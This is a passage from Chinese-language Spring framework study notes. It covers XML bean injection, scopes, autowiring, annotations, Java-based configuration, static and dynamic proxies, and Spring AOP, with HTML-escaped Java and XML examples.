xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!-- 测试特别复杂类型的注入 --&gt;    &lt;bean id=&quot;student&quot; class=&quot;org.yuyr757.pojo.Student&quot;&gt;        &lt;!-- 普通值，value --&gt;        &lt;property name=&quot;name&quot; value=&quot;yuyr757&quot;/&gt;        &lt;!-- bean注入，ref --&gt;        &lt;property name=&quot;address&quot; ref=&quot;address&quot;/&gt;        &lt;!-- 数组注入，array --&gt;        &lt;property name=&quot;books&quot;&gt;            &lt;array&gt;                &lt;value&gt;红楼梦&lt;/value&gt;                &lt;value&gt;水浒传&lt;/value&gt;                &lt;value&gt;西游记&lt;/value&gt;                &lt;value&gt;三国演义&lt;/value&gt;            &lt;/array&gt;        &lt;/property&gt;        &lt;!-- 列表注入，list --&gt;        &lt;property name=&quot;hobbies&quot;&gt;            &lt;list&gt;                &lt;value&gt;听歌&lt;/value&gt;                &lt;value&gt;写代码&lt;/value&gt;                &lt;value&gt;看电影&lt;/value&gt;            &lt;/list&gt;        &lt;/property&gt;        &lt;!-- 映射表注入，map --&gt;        &lt;property name=&quot;card&quot;&gt;            &lt;map&gt;                &lt;entry key=&quot;身份证&quot; value=&quot;111111111111111111&quot;/&gt;                &lt;entry key=&quot;银行卡&quot; value=&quot;222222222222222222&quot;/&gt;            &lt;/map&gt;        &lt;/property&gt;        &lt;!-- 集合注入，set --&gt;        &lt;property name=&quot;games&quot;&gt;            &lt;set&gt;                &lt;value&gt;魂斗罗&lt;/value&gt;                &lt;value&gt;冒险岛&lt;/value&gt;                &lt;value&gt;七龙珠&lt;/value&gt;            &lt;/set&gt;        &lt;/property&gt;        &lt;!-- null注入，null --&gt;        &lt;property name=&quot;wife&quot;&gt;            &lt;null/&gt;        &lt;/property&gt;        &lt;!-- properties对象注入，props，注意和map的区别 --&gt;        &lt;property name=&quot;info&quot;&gt;            &lt;props&gt;                &lt;prop key=&quot;学号&quot;&gt;U201300001&lt;/prop&gt;                &lt;prop key=&quot;性别&quot;&gt;男&lt;/prop&gt;                &lt;prop key=&quot;username&quot;&gt;root&lt;/prop&gt;                &lt;prop key=&quot;password&quot;&gt;root&lt;/prop&gt;            &lt;/props&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;bean id=&quot;address&quot; class=&quot;org.yuyr757.pojo.Address&quot;&gt;        &lt;property name=&quot;address&quot; value=&quot;我是一个地址&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><h4 id="（2）拓展方式"><a href="#（2）拓展方式" class="headerlink" title="（2）拓展方式"></a>（2）拓展方式</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!-- 以上加入这个这个拓展标签 --&gt;    &lt;!-- xmlns:p=&quot;http://www.springframework.org/schema/p&quot; --&gt;    &lt;!-- 加入这个标签后可以直接在后面使用 p:属性名 来定义属性 --&gt;    &lt;bean id=&quot;user5&quot; class=&quot;org.yuyr757.pojo.User&quot; p:id=&quot;5&quot; p:name=&quot;user_test_5&quot;/&gt;    &lt;!-- 以上加入这个这个拓展标签 --&gt;    &lt;!-- xmlns:p=&quot;http://www.springframework.org/schema/c&quot; --&gt;    &lt;!-- 加入这个标签后可以直接在后面使用 c:属性名/下标 来定义构造方法的参数的值 --&gt;    &lt;bean id=&quot;user6&quot; class=&quot;org.yuyr757.pojo.User&quot; c:id=&quot;6&quot; c:name=&quot;user_test_6&quot;/&gt;    &lt;bean id=&quot;user7&quot; class=&quot;org.yuyr757.pojo.User&quot; c:_0=&quot;7&quot; c:_1=&quot;user_test_7&quot;/&gt;&lt;/beans&gt;</code></pre><h3 id="6、bean的作用域"><a href="#6、bean的作用域" class="headerlink" title="6、bean的作用域"></a>6、bean的作用域</h3><h4 id="（1）singleton-Scope（单例，默认）"><a href="#（1）singleton-Scope（单例，默认）" class="headerlink" title="（1）singleton Scope（单例，默认）"></a>（1）singleton Scope（单例，默认）</h4><p>从服务器启动到服务器消灭，全局只创建一个对象。当使用多线程时，多个线程拿到的是同一个对象（<font color="Red">注意线程的安全</font>）。</p><h4 id="（2）prototype（多例）"><a href="#（2）prototype（多例）" class="headerlink" title="（2）prototype（多例）"></a>（2）prototype（多例）</h4><p>每次调用getBean方法，都会重新new一个对象。</p><h4 id="（3）request、session、application"><a href="#（3）request、session、application" class="headerlink" title="（3）request、session、application"></a>（3）request、session、application</h4><p>这三个只能在web应用中使用，和servlet中的不同作用域的context差不多。</p><h3 id="7、bean的自动装配"><a href="#7、bean的自动装配" class="headerlink" title="7、bean的自动装配"></a>7、bean的自动装配</h3><p><font color="Red">即spring会在容器中自动寻找创建某个对象的依赖，并装配到这个对象的属性中。</font>有以下方式：</p><h4 id="（1）在xml中显式配置"><a href="#（1）在xml中显式配置" class="headerlink" title="（1）在xml中显式配置"></a>（1）在xml中显式配置</h4><ul><li>byName：在容器中自动查找对应属性的setter方法名中set后面的值相同的bean的id</li><li>byType：在容器中自动查找对应属性类型相同的bean，使用这种方式，一定要保证相同类型的对象只有一个bean</li></ul><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;dog&quot; class=&quot;org.yuyr757.pojo.Dog&quot;/&gt;    &lt;bean id=&quot;cat&quot; class=&quot;org.yuyr757.pojo.Cat&quot;/&gt;&lt;!--    &lt;bean id=&quot;cat2&quot; class=&quot;org.yuyr757.pojo.Cat&quot;/&gt;--&gt;    &lt;!-- byName：在容器中自动查找对应属性的setter方法名中set后面的值相同的bean的id --&gt;    &lt;bean id=&quot;people1&quot; class=&quot;org.yuyr757.pojo.People&quot; autowire=&quot;byName&quot;&gt;        &lt;property name=&quot;name&quot; value=&quot;这是我的名字1&quot;/&gt;    &lt;/bean&gt;    &lt;!-- byType：在容器中自动查找对应属性类型相同的bean --&gt;    &lt;!-- 当容器中有两个相同类型的对象时，不能使用byType --&gt;    &lt;bean id=&quot;people2&quot; class=&quot;org.yuyr757.pojo.People&quot; autowire=&quot;byType&quot;&gt;        &lt;property name=&quot;name&quot; value=&quot;这是我的名字2&quot;/&gt;    &lt;/bean&gt;    &lt;/beans&gt;</code></pre><h4 id="（2）使用注解"><a href="#（2）使用注解" class="headerlink" title="（2）使用注解"></a>（2）使用注解</h4><p>要在<code>applicationContext.xml</code>中加入以下支持。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;context:annotation-config/&gt;&lt;/beans&gt;</code></pre><p><font color="Red">xml配置和注解的一般结合方式：在xml中配置bean，在注入属性时使用注解。</font></p><h3 id="8、注解"><a href="#8、注解" class="headerlink" title="8、注解"></a>8、注解</h3><h4 id="（1）普通注解"><a href="#（1）普通注解" class="headerlink" title="（1）普通注解"></a>（1）普通注解</h4><ul><li><p><code>@Component</code>：作用目标：类。把该类当作一个bean对象，即相当于在配置中加入了一个bean标签，默认单例。</p></li><li><p><code>@AutoWired</code>：作用目标：很多，一般用于属性。为该属性通过setter方法注入一个值，相当于在配置文件中加入了一个property标签。<font color="Red">先通过byType的方法注入的，当IOC容器中有多个相同类型的对象时，再使用byName的方式来注入，而这个name默认就是根据变量名来的。</font></p></li><li><p><code>@Qualifier</code>：作用目标：很多，一般用于属性。<font color="Red">通过byName自动注入，该注解有一个value属性，指定去找对应名字的bean。</font>可以和<code>@AutoWired</code>配合使用。</p></li><li><p><code>@Resources</code>：作用目标：很多，一般用于属性。<font color="Red">相当于以上两个注解的结合。</font>有一个name属性，用于匹配bean的名字，不填。</p></li><li><p><code>@value</code>：作用目标：很多，一般用于属性。为该属性通过setter方法注入一个普通的确定的值。</p></li></ul><h4 id="（2）衍生注解"><a href="#（2）衍生注解" class="headerlink" title="（2）衍生注解"></a>（2）衍生注解</h4><ul><li><code>Repository</code>：这是Component注解的别名，用于表示这个类是Dao层的类</li><li><code>Service</code>：这是Component注解的别名，用于表示这个类是Service层的类</li><li><code>Controller</code>：这是Component注解的别名，用于表示这个类是Controller层的类</li><li><code>Scope</code>：作用域，singleton、prototype等</li></ul><h3 id="9、使用java类来配置spring"><a href="#9、使用java类来配置spring" class="headerlink" title="9、使用java类来配置spring"></a>9、使用java类来配置spring</h3><p>即不需要再xml中配置spring，而是在一个SpringConfig类中配置。</p><ul><li><code>@configuration</code>：在类上加入这个注解，则表明这是一个配置类。</li><li><code>@Bean</code>：在方法的的上面加这个注解，相当于xml中的一个bean标签，方法的名字就是bean标签的id，方法的返回值就是bean标签的class属性。</li><li><code>@Import</code>：引入其他配置类</li></ul><pre><code class="java">package org.yuyr757.config;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.context.annotation.Import;import org.yuyr757.pojo.Address;import org.yuyr757.pojo.User;@Configuration@Import(MyConfig2.class)public class MyConfig &#123;    @Bean    public Address address()&#123;        return new Address(&quot;1&quot;);    &#125;    @Bean    public Address address2()&#123;        return new Address(&quot;2&quot;);    &#125;    @Bean    public User getUser()&#123;        return new User();    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.pojo;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Value;public class User &#123;    @Value(&quot;yuyr757&quot;)    private String name;    @Autowired    private Address address;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, address=&quot; + address +                &#39;&#125;&#39;;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public Address getAddress() &#123;        return address;    &#125;    public void setAddress(Address address) &#123;        this.address = address;    &#125;    public User() &#123;    &#125;    public User(String name, Address address) &#123;        this.name = name;        this.address = address;    &#125;&#125;</code></pre><h2 id="二、AOP"><a href="#二、AOP" class="headerlink" title="二、AOP"></a>二、AOP</h2><p>AOP：Aspect-Oriented Programming，面向切面编程</p><p><img src="/images/aop-program.png"></p><h3 id="1、代理模式"><a href="#1、代理模式" class="headerlink" title="1、代理模式"></a>1、代理模式</h3><h4 id="（1）静态代理"><a href="#（1）静态代理" class="headerlink" title="（1）静态代理"></a>（1）静态代理</h4><p>角色：</p><ul><li>抽象角色：一般使用接口或抽象类来解决</li><li>真实角色：被代理的角色</li><li>代理角色：代理真是角色，并做一些附属操作</li><li>客户：访问代理角色的人</li></ul><p>以租房为例。</p><p>很多客户（租户）直接找到真实角色（房东），完成一个操作（租房）。但是要完成这个操作要很多其他繁琐的事情（比如每次都要带客户看房、签合同等），真实角色（房东）不想做这些他认为没有意义的操作。于是真实角色（房东）找到一个同样可以做这个操作（租房）的代理角色（中介），让代理角色（中介）去和客户（租户）完成看房、签合同等其他操作，真实角色（房东）就可以专心做租房这一个操作了。抽象角色指一类人，这类人都可以完成租房这个操作。在这里真实角色（房东）和代理角色（中介）都是同一类抽象角色。</p><p><font color="Red">注意在代码中理解四类角色。</font></p><ul><li>示例一</li></ul><pre><code class="java">package org.yuyr757.Demo1;// 抽象角色public interface Rent &#123;    public void rent();&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo1;// 客户public class Client &#123;    public static void main(String[] args) &#123;        // 直接找房东租房        Host host = new Host();        host.rent();        System.out.println(&quot;======================&quot;);        // 找中介租房        // 通过代理可以做一些附属操作        Proxy proxy = new Proxy(host);        proxy.rent();    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo1;// 房东public class Host implements Rent&#123;    public void rent() &#123;        System.out.println(&quot;房东要出租房子&quot;);    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo1;// 中介public class Proxy implements Rent &#123;    private Host host;    public Host getHost() &#123;        return host;    &#125;    public void setHost(Host host) &#123;        this.host = host;    &#125;    public Proxy() &#123;    &#125;    public Proxy(Host host) &#123;        this.host = host;    &#125;    public void seeHouse()&#123;        System.out.println(&quot;中介带看房&quot;);    &#125;    public void payFee()&#123;        System.out.println(&quot;收取中介费&quot;);    &#125;    public void rent() &#123;        this.seeHouse();        host.rent();        this.payFee();    &#125;&#125;</code></pre><ul><li>示例二：</li></ul><pre><code class="java">package org.yuyr757.Demo2;public interface UserService &#123;    public void add();    public void delete();    public void update();    public void query();&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo2;public class UserServiceImpl implements UserService&#123;    public void add() &#123;        System.out.println(&quot;增加了一个用户&quot;);    &#125;    public void delete() &#123;        System.out.println(&quot;删除了一个用户&quot;);    &#125;    public void update() &#123;        System.out.println(&quot;修改了一个用户&quot;);    &#125;    public void query() &#123;        System.out.println(&quot;查询了一个用户&quot;);    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo2;public class UserServiceProxy implements UserService&#123;    private UserService userService;    public UserServiceProxy() &#123;    &#125;    public UserServiceProxy(UserService userService) &#123;        this.userService = userService;    &#125;    public UserService getUserService() &#123;        return userService;    &#125;    public void setUserService(UserService userService) &#123;        this.userService = userService;    &#125;    public void add() &#123;        log(&quot;使用了add&quot;);        this.userService.add();    &#125;    public void delete() &#123;        log(&quot;使用了delete&quot;);        this.userService.delete();    &#125;    public void update() &#123;        log(&quot;使用了update&quot;);        this.userService.update();    &#125;    public void query() &#123;        log(&quot;使用了query&quot;);        this.userService.query();    &#125;    public void log(String message)&#123;        System.out.println(message);    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.Demo2;public class Client &#123;    public static void main(String[] args) &#123;        UserServiceImpl userService = new UserServiceImpl();        UserServiceProxy userServiceProxy = new UserServiceProxy(userService);        userServiceProxy.add();    &#125;&#125;</code></pre><p>优点：</p><ul><li>可以使真实角色专注他自己的业务，其他业务交给其他角色来做，实现了分工</li><li>有良好的扩展性，可以在不修改其他功能的基础上新增其他功能</li></ul><p><font color="Red">缺点：一个真实角色就要产生一个代理角色，代码量会翻倍。有没有一种方法可以避免写这么多代理类，或者自动生成代理类。这就是动态代理。</font></p><h4 id="（2）动态代理（十分重要！）"><a href="#（2）动态代理（十分重要！）" class="headerlink" title="（2）动态代理（十分重要！）"></a>（2）动态代理（十分重要！）</h4><ul><li><p>动态代理和静态代理的角色一样。</p></li><li><p>动态代理的代理角色（代理类）是动态生成的，不是我们自己写的。</p></li><li><p>动态代理有两类：</p><ul><li>基于接口——JDK动态代理</li><li>基于类——cglib</li><li>java字节码实现——javassist</li></ul></li><li><p>需要了解两个类/接口：</p><ul><li>InvocationHandler：调用处理程序</li><li>Proxy：代理类</li></ul></li></ul><pre><code class="java">public interface InvocationHandler &#123;    /**     * Processes a method invocation on a proxy instance and returns     * the result.  This method will be invoked on an invocation handler     * when a method is invoked on a proxy instance that it is     * associated with.     *     * @param   proxy （代理实例，即生成的代理对象，要用该对象去调用某个方法）the proxy instance that the method was invoked on     *     * @param   method （在代理实例上调用的接口方法的实例，即要调用的方法）the &#123;@code Method&#125; instance corresponding to     * the interface method invoked on the proxy instance.  The declaring     * class of the &#123;@code Method&#125; object will be the interface that     * the method was declared in, which may be a superinterface of the     * proxy interface that the proxy class inherits the method through.     *     * @param   args （参数数组）an array of objects containing the values of the     * arguments passed in the method invocation on the proxy instance,     * or &#123;@code null&#125; if interface method takes no arguments.     * Arguments of primitive types are wrapped in instances of the     * appropriate primitive wrapper class, such as     * &#123;@code java.lang.Integer&#125; or &#123;@code java.lang.Boolean&#125;.     *     * @return  the value to return from the method invocation on the     * proxy instance.  If the declared return type of the interface     * method is a primitive type, then the value returned by     * this method must be an instance of the corresponding primitive     * wrapper class; otherwise, it must be a type assignable to the     * declared return type.  If the value returned by this method is     * &#123;@code null&#125; and the interface method&#39;s return type is     * primitive, then a &#123;@code NullPointerException&#125; will be     * thrown by the method invocation on the proxy instance.  If the     * value returned by this method is otherwise not compatible with     * the interface method&#39;s declared return type as described above,     * a &#123;@code ClassCastException&#125; will be thrown by the method     * invocation on the proxy instance.     *     * @throws  Throwable the exception to throw from the method     * invocation on the proxy instance.  The exception&#39;s type must be     * assignable either to any of the exception types declared in the     * &#123;@code throws&#125; clause of the interface method or to the     * unchecked exception types &#123;@code java.lang.RuntimeException&#125;     * or &#123;@code java.lang.Error&#125;.  If a checked exception is     * thrown by this method that is not assignable to any of the     * exception types declared in the &#123;@code throws&#125; clause of     * the interface method, then an     * &#123;@link UndeclaredThrowableException&#125; containing the     * exception that was thrown by this method will be thrown by the     * method invocation on the proxy instance.     *     * @see     UndeclaredThrowableException     */    public Object invoke(Object proxy, Method method, Object[] args)        throws Throwable;&#125;</code></pre><pre><code class="java">// 这个类提供了创建动态代理类和实例的方法，这个方法是静态的，通过这些方法创建的类都继承了Proxy这个类public class Proxy implements java.io.Serializable&#123;        /* -------------------属性------------------- */    // final的属性基本都不用管，因为我们无法做修改    private static final long serialVersionUID = -2222568056686623797L;    private static final Class&lt;?&gt;[] constructorParams = &#123; InvocationHandler.class &#125;;    private static final WeakCache&lt;ClassLoader, Class&lt;?&gt;[], Class&lt;?&gt;&gt;        proxyClassCache = new WeakCache&lt;&gt;(new KeyFactory(), new ProxyClassFactory());    private static final Object key0 = new Object();        // 这个是我们需要传入的对象，就是上面说的那个接口类    protected InvocationHandler h;        /* -------------------构造方法------------------- */    private Proxy() &#123;&#125;;    protected Proxy(InvocationHandler h);        /* -------------------静态方法------------------- */        // 生成代理类，会调用getProxyClass0方法    @CallerSensitive    public static Class&lt;?&gt; getProxyClass(ClassLoader loader,                                         Class&lt;?&gt;... interfaces);        // 检查代理权限    private static void checkProxyAccess(Class&lt;?&gt; caller,                                         ClassLoader loader,                                         Class&lt;?&gt;... interfaces);        // 重要！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！    // 从类加载器中生成一个代理类，文档说生成代理类之前必须检查代理权限（checkProxyAccess）    private static Class&lt;?&gt; getProxyClass0(ClassLoader loader,                                           Class&lt;?&gt;... interfaces);        // 重要！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！    // 生成一个代理类的实例    // loader：真实对象（目标对象）的类加载器    // interfaces：真实对象（目标对象）的接口组成的数组    // h：实现了上面那个InvocationHandler接口的对象    @CallerSensitive    public static Object newProxyInstance(ClassLoader loader,                                          Class&lt;?&gt;[] interfaces,                                          InvocationHandler h);        // 检查caller类和proxyclass类是否在同一个包内，如果不在同一个包内，再检查相关权限    private static void checkNewProxyPermission(Class&lt;?&gt; caller, Class&lt;?&gt; proxyClass);        // 判断一个类是否是一个由Proxy类生成的代理类    public static boolean isProxyClass(Class&lt;?&gt; cl);        // 传入一个对象参数，取出这个对象中的InvocationHandler属性，就是上面的h    public static InvocationHandler getInvocationHandler(Object proxy);        // native，非java实现，不用管    private static native Class&lt;?&gt; defineClass0(ClassLoader loader, String name,                                                byte[] b, int off, int len);        /* -------------------内部private类------------------- */    private static final class Key1 extends WeakReference&lt;Class&lt;?&gt;&gt;&#123;&#125;    private static final class Key2 extends WeakReference&lt;Class&lt;?&gt;&gt;&#123;&#125;    private static final class KeyX&#123;&#125;    private static final class KeyFactory        implements BiFunction&lt;ClassLoader, Class&lt;?&gt;[], Object&gt;&#123;&#125;    // 创建代理类的工厂，如果工厂中有相应接口的代理类的缓存，则会返回一个代理类的复制，否则会重新创建一个代理类    private static final class ProxyClassFactory        implements BiFunction&lt;ClassLoader, Class&lt;?&gt;[], Class&lt;?&gt;&gt;&#123;&#125;&#125;</code></pre><p><font color="Red">动态代理的本质：JVM在运行时动态创建class字节码并加载的过程。要实现的接口和调用接口方法的handler，可以生成一个class字节码，然后由对应的类加载器加载calss字节码，就可以在内存中生成一个类对象（代理类）了。当代理对象调用对应方法时，handler会将方法转发给自己的invoke方法。于是我们就可以在invoke方法中加入增强方法的代码。</font></p><p>用动态代理来增强示例二如下：</p><pre><code class="java">package org.yuyr757.DynamicProxy2;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123;    private Object target;    /**     * 设置真实对象，相当于代理对象要和真实对象签定委托代理的契约，代理对象才可以有权限对做真实对象才能做的事情     * 就像现实生活中，租房中介要拿到房东的授权委托书，中介才可以有权去代理房东租房     */    public void setTarget(Object target) &#123;        this.target = target;    &#125;    public ProxyInvocationHandler() &#123;    &#125;    public ProxyInvocationHandler(Object target) &#123;        this.target = target;    &#125;    /**     * 生成一个代理对象，即生成一个租房中介     * @loader 这个中介的类加载器和房东是一样的，即他们的级别是一样的     * @interfaces 这个中介的接口和房东是一样的，即他们都应该有相同的动作     * @h 这个中介拿到一个InvocationHandler对象，即每当客户有租房的动作时，租房的动作会通过InvocationHandler转发到自己的invoke方法，代理对象就可以在invoker方法中做一些额外操作     * 此外newProxyInstance方法内部还会授予相关代理权限，不然任何一个没有权限的人都可以代理房东去租房     */    public Object getProxy()&#123;        return Proxy.newProxyInstance(                this.target.getClass().getClassLoader(),                this.target.getClass().getInterfaces(),                this        );    &#125;    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        this.log(method.getName());        Object returnObject = method.invoke(target, args);        return returnObject;    &#125;    public void log(String msg)&#123;        System.out.println(&quot;调用了&quot; + msg + &quot;方法&quot;);    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.DynamicProxy2;import org.yuyr757.Demo2.UserService;import org.yuyr757.Demo2.UserServiceImpl;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Arrays;public class Client &#123;    public static void main(String[] args) &#123;        UserService userservice = new UserServiceImpl();        ProxyInvocationHandler handler = new ProxyInvocationHandler(userservice);        UserService proxy = (UserService)handler.getProxy();        System.out.println(&quot;=============查看生成的类的具体信息=============&quot;);        Class proxyClass = proxy.getClass();        System.out.println(&quot;类名称：&quot; + proxyClass.getName());        System.out.println(&quot;类加载器：&quot; + proxyClass.getClassLoader());        System.out.println(&quot;类接口：&quot; + Arrays.toString(proxyClass.getInterfaces()));        System.out.println(&quot;类的父类：&quot; + proxyClass.getSuperclass());        System.out.println(&quot;public方法和父类的public方法：&quot;);        for (Method method : proxyClass.getMethods()) &#123;            System.out.println(method.toString());        &#125;        System.out.println(&quot;所有本类的方法：&quot;);        for (Method method : proxyClass.getDeclaredMethods()) &#123;            System.out.println(method.toString());        &#125;        System.out.println(&quot;所有本类的属性：&quot; );        for (Field declaredField : proxyClass.getDeclaredFields()) &#123;            System.out.println(declaredField);        &#125;        System.out.println(&quot;=============测试方法=============&quot;);        proxy.add();        proxy.delete();        proxy.update();        proxy.query();        System.out.println(&quot;=============代理其他实现了该接口的类只需要修改目标对象即可=============&quot;);        handler.setTarget(new UserServiceImpl2());        UserService proxy2 = (UserService)handler.getProxy();        proxy2.add();        proxy2.delete();        proxy2.update();        proxy2.query();    &#125;&#125;</code></pre><p>动态代理的优点：动态代理代理的是接口，一般是一类业务，所有实现了该接口的类都可以被代理，减少了代码量。</p><p>缺点：效率稍微低一些。因为要在运行时根据接口动态生成字节码，再重新加载字节码。</p><h3 id="2、spring-aop"><a href="#2、spring-aop" class="headerlink" title="2、spring-aop"></a>2、spring-aop</h3><p>几个重要概念：</p><ul><li><strong>切入点（pointcut）</strong>：即我们原有的功能或业务逻辑，一堆方法的集合</li><li><strong>切面（aspect）</strong>：一个切入到我们原有功能里面的新功能的集合（模块），一个类</li><li><strong>通知（advisor）</strong>：切面要完成的工作，即类中的方法</li><li><strong>连接点（joinpoint）</strong>：在切入点具体执行的某一个方法</li></ul><p>通知的五种类型：</p><ul><li><strong>前置通知（Before advice）</strong>：即在目标方法执行前加一个增强方法</li><li><strong>正常返回通知（After returning advice）</strong>：在连接点正常执行完成后执行，如果连接点抛出异常，则不会执行。</li><li><strong>异常返回通知（After throwing advice）</strong>：在连接点抛出异常后执行。</li><li><strong>返回通知（After (finally) advice）</strong>：在连接点执行完成后执行，不管是正常执行完成，还是抛出异常，都会执行返回通知中的内容。</li><li><strong>环绕通知（Around advice）</strong>：即把目标方法包裹在该通知方法内，比如我们使用IDEA有一个快捷键是<code>ctrl + alt + T</code>，即用一个方法把目标方法包裹（surrounding）起来。使用这种通知时，要把目标方法传入我们的通知方法中。<font color="Red">最强的通知类型，完全可以使用这一个通知，然后在通知方法里面定义具体的实现，来满足以上四个通知（下面有示例）。前四个通知和环绕通知最好不要一起使用， 即要么使用前四个通知，要么只使用环绕通知。若都使用了，比如同时使用了前置通知和环绕通知，则目标方法执行前的增强方法好像是根据xml配置的顺序决定的。反正别一起使用就对了。【！！！推荐使用环绕通知，自己写增强方法，因为在有返回值和报异常同时存在的情况下，环绕通知有更强的实现，以上四个通知都做不到】</font></li></ul><h4 id="（1）方式一：使用spring-aop接口实现"><a href="#（1）方式一：使用spring-aop接口实现" class="headerlink" title="（1）方式一：使用spring aop接口实现"></a>（1）方式一：使用spring aop接口实现</h4><p>配置文件中不需要aspect，因为spring会去找实现了相应接口的类当作aspect，需要配置pointcut和advisor。</p><pre><code class="xml">&lt;!-- 配置AOP --&gt;&lt;!-- 方式一：使用原生spring aop的api接口 --&gt;&lt;aop:config&gt;    &lt;!-- 配置切入点，即需要增强的目方法 --&gt;    &lt;!-- expression：表达式，execution(要执行的位置，修饰词 返回值 列名 方法名 参数) --&gt;    &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* org.yuyr757.services.UserServiceImpl.*(..))&quot;/&gt;    &lt;!-- 执行环绕增加 --&gt;    &lt;aop:advisor advice-ref=&quot;logBefore&quot; pointcut-ref=&quot;pointcut&quot;/&gt;    &lt;aop:advisor advice-ref=&quot;logAfter&quot; pointcut-ref=&quot;pointcut&quot;/&gt;&lt;/aop:config&gt;</code></pre><h4 id="（2）方式二：自定义类-xml配置（建议使用）"><a href="#（2）方式二：自定义类-xml配置（建议使用）" class="headerlink" title="（2）方式二：自定义类+xml配置（建议使用）"></a>（2）方式二：自定义类+xml配置（建议使用）</h4><p>要自定义类当作aspect，配置文件中定义aspect标签引用自定义类，再配置pointcut、before、after等。</p><pre><code class="xml">&lt;!-- 方式二：使用自定义类来实现aop --&gt;&lt;aop:config&gt;&lt;!-- 需要配置切面 --&gt;    &lt;aop:aspect ref=&quot;diyPoint&quot;&gt;        &lt;aop:pointcut id=&quot;point&quot; expression=&quot;execution(* org.yuyr757.services.UserServiceImpl.*(..))&quot;/&gt;        &lt;aop:before method=&quot;before&quot; pointcut-ref=&quot;point&quot;/&gt;        &lt;aop:after method=&quot;after&quot; pointcut-ref=&quot;point&quot;/&gt;    &lt;/aop:aspect&gt;&lt;/aop:config&gt;</code></pre><h4 id="（3）方式三：使用自定义类-注解"><a href="#（3）方式三：使用自定义类-注解" class="headerlink" title="（3）方式三：使用自定义类+注解"></a>（3）方式三：使用自定义类+注解</h4><pre><code class="java">package org.yuyr757.DiyAop;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;@Aspectpublic class DiyPointCut2 &#123;    @Before(&quot;execution(* org.yuyr757.services.UserServiceImpl.*(..))&quot;)    public void before()&#123;        System.out.println(&quot;=========方法执行前2=========&quot;);    &#125;    @After(&quot;execution(* org.yuyr757.services.UserServiceImpl.*(..))&quot;)    public void after()&#123;        System.out.println(&quot;=========方法执行后2=========&quot;);    &#125;&#125;</code></pre><pre><code class="xml">&lt;!-- 方式三：使用自定义+注解 --&gt;&lt;aop:aspectj-autoproxy/&gt;&lt;!-- proxy-target-class默认为false，false代表使用jdk自己的动态代理实现，true代表使用cglib实现，一般用false即可 --&gt;&lt;aop:aspectj-autoproxy proxy-target-class=&quot;false&quot;/&gt;</code></pre><h4 id="（4）示例"><a href="#（4）示例" class="headerlink" title="（4）示例"></a>（4）示例</h4><pre><code class="java">package org.yuyr757.DiyAop;import org.aspectj.lang.ProceedingJoinPoint;public class DiyPointCut &#123;    public void before()&#123;        System.out.println(&quot;=========before通知=========&quot;);    &#125;    public void after()&#123;        System.out.println(&quot;=========after通知=========&quot;);    &#125;    public void afterReturning()&#123;        System.out.println(&quot;=========afterReturning通知=========&quot;);    &#125;    public void afterThrowing()&#123;        System.out.println(&quot;=========afterThrowing通知=========&quot;);    &#125;    public Object around(ProceedingJoinPoint joinPoint) throws Throwable &#123;        Object object = 0;        try&#123;            System.out.println(&quot;=========around通知前=========&quot;);            object = joinPoint.proceed();            System.out.println(&quot;=========around通知-afterReturning=========&quot;);        &#125;catch (IllegalArgumentException e)&#123;            System.out.println(&quot;=========around通知-afterThrowing=========&quot;);        &#125;finally &#123;            System.out.println(&quot;=========around通知后=========&quot;);        &#125;        return object;    &#125;&#125;</code></pre><pre><code class="xml">    &lt;aop:config&gt;    &lt;!-- 需要配置切面 --&gt;        &lt;aop:aspect ref=&quot;diyPoint&quot;&gt;            &lt;aop:pointcut 